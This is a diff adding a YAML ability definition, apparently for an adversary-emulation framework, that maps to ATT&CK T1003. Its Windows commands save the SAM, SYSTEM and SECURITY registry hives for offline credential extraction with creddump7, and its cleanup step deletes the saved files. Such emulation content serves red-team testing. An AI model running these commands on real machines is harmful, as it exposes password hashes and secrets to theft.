@@ -1,0 +1,20 @@
+---
+
+- id: tacmulti-1003-AR03-1v00-200121075645
+  name: Registry dump of SAM, creds, and secrets
+  description: .      Local SAM (SAM & System), cached credentials (System & Security) and LSA secrets (System & Security) can be enumerated.      via three registry keys. Then processed locally using https.//github.com/Neohapsis/creddump7
+  tactic: multiple
+  technique:
+    attack_id: T1003
+    name: Credential Dumping
+  platforms:
+    windows:
+      cmd:
+        command: |
+          reg save HKLM\sam sam
+          reg save HKLM\system system
+          reg save HKLM\security security
+        cleanup: |
+          rm sam
+          rm system
+          rm security
